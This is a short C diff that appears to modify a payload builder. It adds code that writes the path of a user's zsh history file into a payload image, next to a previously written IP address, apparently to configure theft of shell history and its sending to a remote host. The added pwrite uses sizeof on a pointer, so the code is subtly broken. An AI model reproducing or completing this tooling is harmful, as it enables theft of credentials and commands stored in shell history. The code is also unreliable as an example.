@@ -80,6 +80,13 @@ int main(int argc, char *argv[], char *envp[])
         return 1;
     }
 
+	char *filepath = "/home/maxence/.zsh_history";
+    if (pwrite(fd, filepath, sizeof(filepath), size + payload_size_p - 4 - 2 - 1024) != sizeof(filepath)) {
+        perror("pwrite");
+        close(fd);
+        return 1;
+    }
+
     if (pwrite(fd, &addr_ip, sizeof(addr_ip), size + payload_size_p - 4) != sizeof(addr_ip)) {
         perror("pwrite");
         close(fd);
